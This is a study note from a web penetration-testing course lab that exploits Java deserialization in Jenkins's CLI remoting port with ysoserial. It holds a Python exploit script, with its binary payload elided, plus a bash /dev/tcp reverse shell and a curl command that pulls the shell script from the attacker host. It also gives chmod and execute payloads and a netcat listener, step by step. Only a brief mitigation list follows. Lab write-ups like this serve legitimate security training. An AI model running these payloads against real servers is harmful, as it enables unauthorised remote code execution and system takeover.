2026-02-06

Status:

Tags: [[eWPTX]] [[Serialization]]
###### Prerequisites: [[Java Serialization & Deserialization]] [[ysoserial (Overview)]] [[Insecure Deserialization]]
# Java Deserialization Lab — Jenkins RCE (ysoserial)

## Overview

This lab demonstrates exploiting an insecure Java deserialization vulnerability in Jenkins via its CLI remoting port. The exploit uses `ysoserial` with the `CommonsCollections1` gadget chain to achieve Remote Code Execution (RCE).

**Attack chain**: ysoserial payload → Jenkins CLI port → deserialization → RCE → reverse shell

---

## Step 1: Lab Setup

Start the lab and wait until ready. The Kali Linux interface will be available in the browser.

![[Pics/INE/java-deserialization-lab/0.png]]

---

## Step 2: Network Reconnaissance

Scan the target with Nmap to identify open ports and services.

```bash
nmap demo.ine.local
```

![[Pics/INE/java-deserialization-lab/1.png]]

Identify the target IP and open ports — Jenkins runs on port **8080**.

---

## Step 3: Inspect Jenkins Application

Navigate to the Jenkins instance in the browser.

```
http://192.24.161.3:8080/
```

![[Pics/INE/java-deserialization-lab/2.png]]

---

## Step 4: Prepare the Python Exploit

Save the following exploit code as `exploit.py`. This script connects to Jenkins' CLI remoting port and sends a serialized Java object payload.

Source: `foxglovesec/JavaUnserializeExploits` (jenkins.py)

```python
#!/usr/bin/python
#usage: ./jenkins.py host port /path/to/payload
import socket
import sys
import requests
import base64

host = sys.argv[1]
port = sys.argv[2]

# Query Jenkins over HTTP to find what port the CLI listener is on
r = requests.get('http://' + host + ':' + port)
cli_port = int(r.headers['X-Jenkins-CLI-Port'])

# Open a socket to the CLI port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (host, cli_port)
print 'connecting to %s port %s' % server_address
sock.connect(server_address)

# Send headers
headers = '\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
print 'sending "%s"' % headers
sock.send(headers)

data = sock.recv(1024)
print >>sys.stderr, 'received "%s"' % data

data = sock.recv(1024)
print >>sys.stderr, 'received "%s"' % data

# Read the serialized payload and embed it in the Jenkins remoting protocol
payloadObj = open(sys.argv[3], 'rb').read()
payload_b64 = base64.b64encode(payloadObj)

payload = (
    '\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d'
    '\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d'
    '\x3d\x3d\x3e' + payload_b64 +
    # ... (Hudson remoting UserRequest serialized object binary data)
    # This wraps the ysoserial payload inside a Jenkins CLI remoting request
    '<JENKINS_REMOTING_BINARY_PAYLOAD>'
)

print 'sending payload...'
sock.send(payload)
```

**How it works**:
1. Queries Jenkins HTTP to discover the CLI listener port (`X-Jenkins-CLI-Port` header)
2. Opens a raw TCP socket to the CLI port
3. Sends the CLI protocol handshake (`Protocol:CLI-connect`)
4. Wraps the ysoserial payload inside a `hudson.remoting.UserRequest` serialized object
5. Sends it — Jenkins deserializes it without validation, triggering the gadget chain

---

## Step 5: Create Reverse Shell Script

Create `shell.sh` with a bash reverse shell:

```bash
bash -i >& /dev/tcp/192.24.161.2/9999 0>&1
```

Replace `192.24.161.2` with your attacker IP and `9999` with your listener port.

---

## Step 6: Start Netcat Listener

Open a terminal and start listening for the reverse shell:

```bash
nc -lvp 9999
```

![[Pics/INE/java-deserialization-lab/4.png]]

---

## Step 7: Host the Reverse Shell Script

In the directory containing `shell.sh`, start a Python HTTP server:

```bash
python -m SimpleHTTPServer 8888
```

![[Pics/INE/java-deserialization-lab/5.png]]

---

## Step 8: Generate ysoserial Payload (Download shell.sh)

Use `ysoserial` with `CommonsCollections1` to generate a payload that makes the target download our reverse shell:

```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar \
    CommonsCollections1 \
    "curl http://192.24.161.2:8888/shell.sh -o /tmp/shell.sh" \
    > /root/payload.out
```

![[Pics/INE/java-deserialization-lab/6.png]]

---

## Step 9: Send Payload — Download shell.sh to Target

Execute the exploit to deliver the first payload:

```bash
python exploit.py 192.24.161.3 8080 /root/payload.out
```

![[Pics/INE/java-deserialization-lab/7.png]]

Verify the Python HTTP server shows the target downloaded `shell.sh`:

![[Pics/INE/java-deserialization-lab/8.png]]

The `GET /shell.sh HTTP/1.1 200` confirms the target machine downloaded our reverse shell script.

---

## Step 10: Generate Payload — Make shell.sh Executable

Generate a second payload to `chmod +x` the downloaded script:

```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar \
    CommonsCollections1 \
    "chmod +x /tmp/shell.sh" \
    > /root/payload.out
```

![[Pics/INE/java-deserialization-lab/9.png]]

---

## Step 11: Send Payload — chmod +x

```bash
python exploit.py 192.24.161.3 8080 /root/payload.out
```

![[Pics/INE/java-deserialization-lab/10.png]]

---

## Step 12: Generate Payload — Execute shell.sh

Generate the final payload to execute the reverse shell:

```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar \
    CommonsCollections1 \
    "/bin/bash /tmp/shell.sh" \
    > /root/payload.out
```

![[Pics/INE/java-deserialization-lab/11.png]]

---

## Step 13: Send Payload — Trigger Reverse Shell

```bash
python exploit.py 192.24.161.3 8080 /root/payload.out
```

![[Pics/INE/java-deserialization-lab/12.png]]

---

## Step 14: Receive Reverse Shell

Switch to the Netcat listener terminal — a shell should have arrived:

```bash
id
```

![[Pics/INE/java-deserialization-lab/13.png]]

**RCE achieved.** We have a shell as `jenkins` user (`uid=1000(jenkins)`).

---

## Attack Summary

| Step | Action | Purpose |
|------|--------|---------|
| 1 | `nmap` target | Discover Jenkins on port 8080 |
| 2 | Save `exploit.py` | Jenkins CLI deserialization exploit |
| 3 | Create `shell.sh` | Bash reverse shell payload |
| 4 | `nc -lvp 9999` | Listener for incoming shell |
| 5 | `python -m SimpleHTTPServer` | Host shell.sh for target to download |
| 6 | ysoserial + `curl` command | Payload: download shell.sh |
| 7 | ysoserial + `chmod +x` | Payload: make shell executable |
| 8 | ysoserial + `/bin/bash` | Payload: execute reverse shell |

---

## Key Concepts

- **Vulnerability**: Jenkins CLI remoting port deserializes Java objects without validation
- **Gadget chain**: `CommonsCollections1` — present in Jenkins classpath via Apache Commons Collections
- **Why 3 payloads**: Each deserialization triggers a single OS command. We need three steps: download, chmod, execute
- **Detection**: The `X-Jenkins-CLI-Port` HTTP header reveals the CLI port — this is also a recon indicator
- **Mitigation**: Upgrade Jenkins, disable CLI over remoting, remove vulnerable Commons Collections versions

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance |
| `ysoserial` | Java deserialization payload generator |
| `exploit.py` | Jenkins CLI protocol exploit script |
| `nc` (Netcat) | Reverse shell listener |
| `python SimpleHTTPServer` | Payload delivery via HTTP |
